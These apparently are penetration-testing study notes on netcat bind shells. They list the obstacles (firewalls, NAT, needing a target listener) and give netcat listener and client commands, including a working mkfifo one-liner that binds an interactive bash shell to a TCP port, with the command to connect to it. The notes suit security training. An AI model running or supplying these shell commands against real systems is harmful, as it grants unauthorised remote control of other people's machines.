
Target has a listener started, attacker connects

Problems
- Need to have a listener on target
- No listener - how to get one?
- Firewall rules and NAT on edge, so we would need to be on internal network already
- OS firewalls block incoming connections that aren't associated with trusted network-based applications

nc server-client

Target (Server)
```shell-session
nc -lvnp 7777
```

Host (Client)
```shell-session
nc -nv 10.129.41.200 7777
```


### Establishing a Basic Bind Shell with Netcat

Binding a Bash shell to the TCP session
```shell-session
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

Host
```shell-session
nc -nv 10.129.41.200 7777
```

